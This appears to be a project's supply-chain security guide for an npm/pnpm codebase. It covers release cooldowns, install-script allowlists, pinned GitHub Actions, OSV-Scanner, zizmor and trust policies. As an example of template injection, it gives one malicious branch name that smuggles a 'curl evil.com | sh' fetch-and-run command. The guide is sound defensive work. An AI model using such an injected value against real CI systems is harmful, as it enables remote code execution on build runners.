---
paths:
  - "package.json"
  - ".npmrc"
  - ".github/workflows/**/*.yml"
---

# Supply-chain security

Compromised npm packages are a recurring threat. The pattern is consistent: an attacker gains publish access to a popular package, ships a new patch version with malicious code (often in a postinstall script), and CI runners + dev machines auto-install it within minutes due to caret ranges. The bad version is detected and removed within hours — but a single \`npm install\` is enough to compromise a dev machine or CI runner.

This project ships layered controls so each stage of the attack is blocked by at least one mechanism.

## Controls (already configured)

### 1 day version cooldown
\`.npmrc\` sets \`minimum-release-age=1440\` (24h). pnpm refuses to install any package version published less than a day ago. Compromised versions are typically detected within hours; the cooldown ensures we never install one.

\`.ncurc.json\` mirrors this for \`npm-check-updates\`. \`.github/dependabot.yml\` mirrors it via \`cooldown: { default-days: 1 }\`.

**Bypassing for an urgent patch** (e.g. a CVE that just dropped): add the package to \`minimum-release-age-exclude[]\` in \`.npmrc\` in a PR with a written justification. Remove the entry once the cooldown for that version has passed naturally. Excluded packages still go through safe-chain + OSV-Scanner.

### Aikido safe-chain
CI runs \`pnpm dlx @aikidosec/safe-chain@<pinned> setup-ci\` BEFORE \`pnpm install\`. Installs PATH shims that wrap pnpm/npm/yarn/npx and check every package against Aikido's feed of known-malicious releases.

**Local dev** (one-time per machine, not auto-set-up):
\`\`\`
npm i -g @aikidosec/safe-chain
safe-chain setup
\`\`\`

### Install-script allowlist
\`package.json\` declares \`pnpm.onlyBuiltDependencies\`. pnpm v10 disables \`preinstall\`/\`install\`/\`postinstall\` scripts by default; only the listed packages can run them. Adding a new package to the list requires a PR.

The risky moment is bumping an already-allowlisted package — a compromised version inherits the allowance. The cooldown + safe-chain mitigate that.

### Pinned package manager
\`packageManager: "pnpm@<version>"\` + \`engines.node\` + \`engine-strict=true\` in \`.npmrc\`. Corepack rejects other package managers; install fails on a mismatched Node version. CI uses the exact pnpm version from \`package.json\`.

### Lockfile + frozen install
\`pnpm-lock.yaml\` is committed. CI runs \`pnpm install --frozen-lockfile\` so any drift between the lockfile and \`package.json\` fails the build instead of silently re-resolving (which would defeat the cooldown + trust-policy checks applied locally).

### OSV-Scanner
\`.github/workflows/security.yml\` runs OSV-Scanner against \`pnpm-lock.yaml\` on every push, PR, and weekly cron. Catches vulnerabilities disclosed AFTER a dependency was installed (the cooldown doesn't help with those).

### zizmor
The same workflow runs zizmor — static analysis for GitHub Actions misconfigurations (unsafe expression interpolation, overprivileged tokens, etc.).

### Pinned actions
Every \`uses:\` reference in \`.github/workflows/*.yml\` is pinned to a 40-character commit SHA with the version as a trailing comment:
\`\`\`yaml
uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
\`\`\`
A commit SHA cannot be reassigned. Even if the tag \`v6\` is repointed to malicious code, the workflow continues to execute the exact commit that was reviewed.

The trailing-comment placement matters — Dependabot updates the SHA + comment together. Other styles go stale.

### No GitHub-context interpolation in `run:` blocks
Workflow `run:` script bodies must NEVER inline `${{ github.<thing> }}` directly — that's a code-injection vector when the value is attacker-controllable (e.g. a malicious PR branch named `; curl evil.com | sh; #`). Pass them through `env:` and read shell variables instead:

```yaml
# ✗ Bad — github.head_ref interpolated into shell
- run: |
    git checkout "${{ github.head_ref }}"

# ✓ Good — env var, no template injection surface
- run: |
    git checkout "$BRANCH"
  env:
    BRANCH: ${{ github.head_ref }}
```

Safe to interpolate inline: top-level `env:`, `if:` conditions, action `with:` inputs, `concurrency.group`. Risky: anything that ends up parsed by a shell.

zizmor's `template-injection` rule catches this in CI.

### Cooldown — zizmor mismatch (intentional)
zizmor's `dependabot-cooldown` rule wants ≥7 days. Our `.npmrc` mirrors a 1-day window (24h) — the cooldown window is a tradeoff between catching bad releases and not blocking urgent fixes. Suppress with an inline ignore so zizmor stays useful for the rules that matter:

```yaml
default-days: 1 # zizmor: ignore[dependabot-cooldown]
```

### Trust policy
`package.json` sets `pnpm.trustPolicy: "no-downgrade"` (pnpm ≥ 10.21). Refuses install if a package's trust level decreased compared to previously installed versions (e.g. previously published with provenance, new version doesn't). Catches the common compromise pattern where an attacker republishes from a stolen account without the original signing setup.

For legitimate exceptions: `pnpm.trustPolicyExclude` (package names that bypass) or `pnpm.trustPolicyIgnoreAfter` (skip for versions older than a duration). Use sparingly with written justification.

### Block exotic transitive deps
`pnpm.blockExoticSubdeps: true` (pnpm ≥ 10.26). Direct deps can still resolve from git URLs / tarballs / local paths when explicitly declared, but a transitive dep can never drag in code from outside the registry.

### Transitive dep overrides
`pnpm.overrides` pins a vulnerable transitive dep to a fixed version when the direct dep hasn't patched yet. Document each pin in a sibling `//overrides-<name>` key (sibling of `overrides`, not inside it — pnpm rejects `//`-prefixed package selectors). Example from the scaffolded `package.json`:

```json
"//overrides-esbuild": "GHSA-67mh-4wv8-2f99 — esbuild < 0.25.0 lets any website send requests to dev server.",
"overrides": {
  "esbuild": "^0.25.0"
}
```

Each override should:
1. Reference an OSV / CVE id in an adjacent `//overrides-<name>` comment so a future reader knows why the pin exists.
2. Be removed once the upstream direct deps have caught up — leaving stale overrides locks you out of legitimate version bumps.

OSV-Scanner CI surfaces these advisories — when a new advisory lands, add the override + commit the updated lockfile.

## When you bump dependencies

- Use Dependabot PRs (auto-respects cooldown). For urgent off-cycle bumps, add the package to \`.npmrc\`'s \`minimum-release-age-exclude\` with a justification, then remove once the cooldown passes.
- Never \`pnpm update\` blindly without reviewing the diff — that bypasses cooldown awareness for direct deps you're choosing to bump.
- After bumping, commit the updated \`pnpm-lock.yaml\`. CI's \`--frozen-lockfile\` will fail otherwise.
